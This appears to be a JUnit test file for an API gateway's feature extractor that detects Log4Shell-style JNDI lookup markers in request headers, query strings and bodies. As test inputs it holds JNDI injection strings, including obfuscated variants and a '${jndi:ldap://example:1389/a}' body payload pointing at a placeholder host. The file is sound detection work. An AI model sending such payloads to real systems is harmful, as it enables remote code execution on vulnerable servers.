package com.apisecurity.gateway.features;

import org.junit.jupiter.api.Test;
import org.springframework.mock.web.MockHttpServletRequest;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

public class JndiLookupMarkerTest {

    private final FeatureExtractor extractor = new FeatureExtractor();

    @Test
    public void markerMatchesPythonCases() {
        assertEquals(0, marker("application/json"));
        assertEquals(1, marker("${jndi:example}"));
        assertEquals(1, marker("${JnDi:example}"));
        assertEquals(1, marker("${  jndi  :example}"));
        assertEquals(0, marker("jndi-without-lookup"));
        assertEquals(1, marker("%24%7Bjndi:example"));
    }

    @Test
    public void experimentalVectorKeepsProductionOrderAndAppendsMarker() {
        MockHttpServletRequest request = booksRequest();
        Map<String, Object> production = extractor.extractAtrdfFeatures(request, "");
        Map<String, Object> experimental = extractor.extractAtrdfExperimentalFeatures(request, "");

        assertEquals(13, production.size());
        assertFalse(production.containsKey("jndi_lookup_marker"));
        assertEquals(FeatureExtractor.experimentalFeatureOrder(), List.copyOf(experimental.keySet()));
        assertEquals(14, experimental.size());
        assertEquals(0, experimental.get("jndi_lookup_marker"));
    }

    @Test
    public void legitimateRoutesDoNotCarryTheMarker() {
        assertEquals(0, extractor.extractAtrdfExperimentalFeatures(booksRequest(), "").get("jndi_lookup_marker"));
        assertEquals(0, extractor.extractAtrdfExperimentalFeatures(route("/api/health"), "").get("jndi_lookup_marker"));
        assertEquals(0, extractor.extractAtrdfExperimentalFeatures(route("/api/comments/book/101"), "").get("jndi_lookup_marker"));
        assertEquals(0, extractor.extractAtrdfExperimentalFeatures(route("/"), "").get("jndi_lookup_marker"));
    }

    @Test
    public void markerUsesHeaderValuesAndIgnoresTestIds() {
        MockHttpServletRequest matching = booksRequest();
        matching.addHeader("Accept", "${jndi:example}");
        assertEquals(1, extractor.extractAtrdfExperimentalFeatures(matching, "").get("jndi_lookup_marker"));

        MockHttpServletRequest testIdOnly = booksRequest();
        testIdOnly.addHeader("X-Test-Case-Id", "${jndi:example}");
        assertEquals(0, extractor.extractAtrdfExperimentalFeatures(testIdOnly, "").get("jndi_lookup_marker"));

        MockHttpServletRequest body = booksRequest();
        assertEquals(1, extractor.extractAtrdfExperimentalFeatures(body,
                "{\"text\":\"${jndi:ldap://example:1389/a}\"}").get("jndi_lookup_marker"));

        MockHttpServletRequest query = booksRequest();
        query.setQueryString("q=%24%7Bjndi%3Aexample");
        assertEquals(1, extractor.extractAtrdfExperimentalFeatures(query, "").get("jndi_lookup_marker"));
    }

    private static int marker(String value) {
        return FeatureExtractor.valueHasJndiLookup(value) ? 1 : 0;
    }

    private static MockHttpServletRequest booksRequest() {
        return route("/api/books");
    }

    private static MockHttpServletRequest route(String path) {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", path);
        request.setScheme("http");
        request.setServerName("127.0.0.1");
        request.setServerPort(8080);
        request.setRequestURI(path);
        request.addHeader("Host", "127.0.0.1:8080");
        request.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        request.addHeader("Accept", "application/json");
        return request;
    }
}
